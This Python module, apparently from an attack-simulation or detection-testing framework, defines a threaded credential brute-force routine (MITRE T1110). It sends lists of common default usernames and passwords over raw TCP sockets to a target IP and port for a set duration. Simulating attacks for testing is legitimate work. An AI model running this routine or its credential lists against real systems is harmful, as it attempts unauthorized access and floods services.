"""Brute Force — SSH/HTTP login brute force."""
from modules.attacks.base import BaseAttack, AttackResult, logger
import time
import threading


class BruteForceAttack(BaseAttack):
    name = "brute_force"
    description = "Credential brute force — attempts multiple login combinations"
    mitre_ref = "T1110"

    def run(self, target_ip: str, duration_s: int = 60, intensity: str = "medium",
            service: str = "ssh", target_port: int = 22, **kwargs) -> AttackResult:
        if not self.validate(target_ip):
            return AttackResult(success=False, error=f"Invalid IP: {target_ip}")
        threads = {"low": 1, "medium": 5, "high": 20}.get(intensity, 5)
        common_users = ["admin", "root", "user", "test", "guest"]
        common_passes = ["admin", "password", "123456", "root", "1234", "test"]
        count = 0
        stop = threading.Event()
        lock = threading.Lock()

        def _worker():
            nonlocal count
            import socket
            while not stop.is_set():
                for user in common_users:
                    for pwd in common_passes:
                        if stop.is_set():
                            return
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(1)
                            s.connect((target_ip, target_port))
                            s.send(f"{user}:{pwd}\n".encode())
                            s.close()
                        except Exception:
                            pass
                        with lock:
                            count += 1
        start = time.time()
        workers = [threading.Thread(target=_worker, daemon=True) for _ in range(threads)]
        for w in workers:
            w.start()
        stop.wait(timeout=duration_s)
        stop.set()
        for w in workers:
            w.join(timeout=2)
        elapsed = time.time() - start
        logger.info("Brute force: %d attempts in %.1fs → %s:%d (%s)", count, elapsed, target_ip, target_port, service)
        return AttackResult(success=True, packets=count, duration=elapsed)
